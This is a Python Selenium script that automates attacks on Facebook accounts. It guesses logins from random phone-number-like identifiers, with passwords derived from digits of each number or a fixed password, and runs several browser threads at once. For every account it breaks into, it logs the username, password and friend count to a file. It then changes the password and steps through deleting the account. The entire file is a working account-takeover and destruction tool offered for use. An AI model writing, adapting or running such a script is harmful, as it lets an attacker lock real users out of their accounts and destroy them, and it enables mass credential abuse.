from datetime import datetime
import os
from random import randint
import threading 
from time import sleep
from selenium import webdriver 
from selenium.webdriver.common.by import By
from urllib import parse
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
import ctypes

class thread_with_exception(threading.Thread):
    def __init__(self, target, args):
        threading.Thread.__init__(self, target=target, args=args )
        self.target = target    
        self.args = args    
      
    def get_id(self):
        if hasattr(self, '_thread_id'):
            return self._thread_id
        for id, thread in threading._active.items():
            if thread is self:
                return id
    def raise_exception(self):
        thread_id = self.get_id()
        resu = ctypes.pythonapi.PyThreadState_SetAsyncExc(thread_id,
              ctypes.py_object(SystemExit))
        if resu > 1: 
            ctypes.pythonapi.PyThreadState_SetAsyncExc(thread_id, 0)
            print('Failure in raising exception')      


DELAY = 5
allThreads = []


def run(firstNum, secondNum, totalTabs, totalAccount, prefix, newPass, customPass, passwordIndex, changeAtmps, changeSuccessAtmps):

    currentTime = str(datetime.strftime(datetime.now(), "%Y-%m-%d__%H-%M-%S"))
    try:
        os.makedirs("./output")
    except Exception:
        pass
    
    
    allThreads = []
    numberTried = []
    mainList = []
    tmpList = []
    while True:
        tmp = randint(firstNum, secondNum)
        if (tmp not in numberTried):
            numberTried.append(tmp)
            tmpList.append(tmp)
            if len(tmpList) == totalAccount // totalTabs:
                mainList.append(tmpList)
                tmpList = []
            if(len(mainList) == totalTabs):
                break       
    print(mainList)
        
    def tryWithCred(driver, number):
        password = ''
        if(customPass != ''):
            password = customPass
        else :
            if(passwordIndex < 0):
                password = str(number)[passwordIndex:]
            else:
                password = str(number)[:passwordIndex]

        emailInput = driver.find_element(By.ID, "email")
        emailInput.send_keys(f"{prefix}{number}")
        passInput = driver.find_element(By.ID, "pass")
        
        passInput.send_keys(password)
        loginBtn = driver.find_element(By.NAME, 'login')
        loginBtn.click()
        sleep(2)
        try:
            WebDriverWait(driver, DELAY/2).until(EC.presence_of_element_located((By.XPATH, "/html/body/div[1]/div[1]/div[1]/div/div[3]/div/div/div/div[1]/div[1]/div/div[2]/div/div/div/div[3]/div/div[2]/div/div/div")))
        except Exception:
            return
        driver.get("https://www.facebook.com/profile.php?")
        sleep(1)
        cUrl = driver.current_url
        urlData = dict(parse.parse_qsl(parse.urlsplit(cUrl).query))
        username = ""
        if(urlData == {}):
            username = cUrl.replace("https://www.facebook.com/", "")
            cUrl.replace("/", "")
        else:
            username = urlData['id']

        totalFriend = WebDriverWait(driver, DELAY).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div/div[1]/div/div[3]/div/div/div/div[1]/div[1]/div/div/div[1]/div[2]/div/div/div/div[3]/div/div/div[2]/span/a'))).text
        
            
        with open(f"/output/{currentTime}/accounts.txt", "a+") as f:
            f.write(f"{username} - {password} - {totalFriend}\n")
            
        driver.get("https://mobile.facebook.com/settings/security/password/")

        currentPass = WebDriverWait(driver, DELAY).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div/div[4]/div/div[1]/form/div[1]/div/input[1]')))
        currentPass.send_keys(password)
        newPassInp = WebDriverWait(driver, DELAY).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div/div[4]/div/div[1]/form/div[1]/div/input[2]')))
        newPassInp.send_keys(newPass)
        newConPassInp = WebDriverWait(driver, DELAY).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div/div[4]/div/div[1]/form/div[1]/div/input[3]')))
        newConPassInp.send_keys(newPass)

        submitBtn = WebDriverWait(driver, DELAY).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div/div[4]/div/div[1]/form/div[2]/button')))
        submitBtn.click()

        WebDriverWait(driver, DELAY).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div/div[4]/div/form/div[1]/div/section[2]/fieldset/label[2]/div/div[1]/div'))).click()
        WebDriverWait(driver, DELAY).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div/div[4]/div/form/div[2]/button'))).click()


        driver.get("https://mobile.facebook.com/account/delete/")
        WebDriverWait(driver, DELAY).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div/div[4]/div/div[1]/form/div[1]/div[3]/div[2]/label/div/div[1]/input'))).click()
        WebDriverWait(driver, DELAY).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div/div[4]/div/div[1]/form/div[2]/button'))).click()
        WebDriverWait(driver, DELAY).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div/div[4]/div/div[1]/div/div[2]/form/div[6]/div[1]/button'))).click()
        WebDriverWait(driver, DELAY).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div/div[4]/div/div[1]/div[3]/a'))).click()
        WebDriverWait(driver, DELAY).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div/div[4]/div/div/form/div[1]/div/div/div[4]/input[1]'))).send_keys(newPass)
        WebDriverWait(driver, DELAY).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div/div[4]/div/div/form/div[2]/button'))).click()
        sleep(1)
        WebDriverWait(driver, DELAY).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div/div[4]/div/div[1]/form/div[2]/button'))).click()
        changeSuccessAtmps(1)


                

    os.makedirs(f"./output/{currentTime}")
    with open(f"./output/{currentTime}/accounts.txt", "w") as f:
        pass
    for numbers in mainList:
        def tryAccount(numbers):
            driver = webdriver.Chrome(executable_path='./chromedriver.exe')
            for number in numbers:
                changeAtmps(1)
                driver.get("https://www.facebook.com/")
                tryWithCred(driver, number)
                print(number)
            
        t = thread_with_exception(target=tryAccount, args=(numbers,))
        t.start()
        allThreads.append(t)
    return allThreads
    
    
def quitAllWindow(threads):
    def r():
        for t in  threads:
            t.raise_exception()
            
    threading.Thread(target=r).start()